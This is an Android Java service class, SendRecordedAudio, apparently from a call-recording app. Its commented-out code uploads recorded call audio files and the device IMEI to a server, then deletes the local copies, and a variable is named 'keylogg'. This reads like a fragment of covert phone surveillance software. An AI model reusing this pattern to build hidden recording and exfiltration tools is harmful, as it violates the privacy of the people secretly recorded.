package rapidora.co.myapplication.services;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.PowerManager;
import android.util.Log;

import org.apache.http.entity.mime.HttpMultipartMode;
import org.apache.http.entity.mime.MultipartEntity;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.entity.mime.content.StringBody;

import java.io.File;

import rapidora.co.myapplication.CallRecording.FileHelper;
import rapidora.co.myapplication.common.ConnectionDetector;
import rapidora.co.myapplication.common.Constants;
import rapidora.co.myapplication.common.CustomLogger;
import rapidora.co.myapplication.common.SessionManagment;
import rapidora.co.myapplication.common.Utils;


public class SendRecordedAudio extends IntentService {
    String calllog;
    SessionManagment sd;
    ConnectionDetector cd;
    int count;
   // PowerManager.WakeLock screenLock;
    File keylogg;
    String filepath;

    public SendRecordedAudio() {
        super(SendRecordedAudio.class.getName());

    }

    Context context;
    String current_date;

    @Override
    protected void onHandleIntent(Intent intent) {
        cd = new ConnectionDetector(getApplicationContext());
        sd = new SessionManagment(getApplicationContext());

    /*    screenLock = ((PowerManager) getApplicationContext().getSystemService(Context.POWER_SERVICE)).newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "TAG");
        screenLock.acquire();*/
        filepath = intent.getStringExtra("file");
        this.context = context;
        if (!cd.isConnectingToInternet()) {

        } else {

//            generateNoteOnSD2();

        }


    }

    @Override
    public void onDestroy() {

      //  if (screenLock.isHeld()) screenLock.release();
        super.onDestroy();
    }


/*
    public void generateNoteOnSD2() {
        try {


            if (!cd.isConnectingToInternet()) {

            } else {
                String filepath = FileHelper.getCacheDir(getApplicationContext()) + "/" + Constants.FILE_AUDIO;
                File file = new File(filepath);
                String listOfFileNames[] = file.list();
                if (listOfFileNames.length > 0) {
                    for (int i = 0; i < listOfFileNames.length; i++) {
                        File file2 = new File(filepath, listOfFileNames[i]);
                        String filepath2 = file2.toString();
                        new SendPostRequest(filepath2).execute();
                        Log.e("filename", filepath2);
                    }
                } else {
                    Utils.cancelAlarmAudioRecord(getApplicationContext());
                }


            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
*/


/*
    public class SendPostRequest extends AsyncTask<String, Void, String> {

        String filp;

        SendPostRequest(String s) {
            filp = s;
        }

        protected void onPreExecute() {

        }

        protected String doInBackground(String... arg0) {

            try {
                Log.e("fileAudio REcording", filp);


                File keylogg = new File(filp);


                MultipartEntity reqEntity = new MultipartEntity(HttpMultipartMode.BROWSER_COMPATIBLE);

                reqEntity.addPart("file", new FileBody(keylogg));

                reqEntity.addPart("imei", new StringBody(sd.getIMEI()));


                String response = Utils.multipost(Constants.SEND_RECORDED_AUDIO, reqEntity);

                if (response != null) {
                    FileHelper.deleteAudioFile(getApplicationContext(), filp);
                    //  stopSelf();
                }
                Log.e("response", response);
                CustomLogger.getInsatance(getApplicationContext()).putLog("CallLogService:-" + "response" + response);
                return response;
            } catch (Exception e) {
                CustomLogger.getInsatance(getApplicationContext()).putLog("CallLogService:-" + "Error" + e.toString());
                Log.e("exception", e.toString());
                return new String("Exception: " + e.getMessage());
            }
        }

        @Override
        protected void onPostExecute(String result) {
            try {

            } catch (Exception ex) {


            }

        }
    }
*/
}
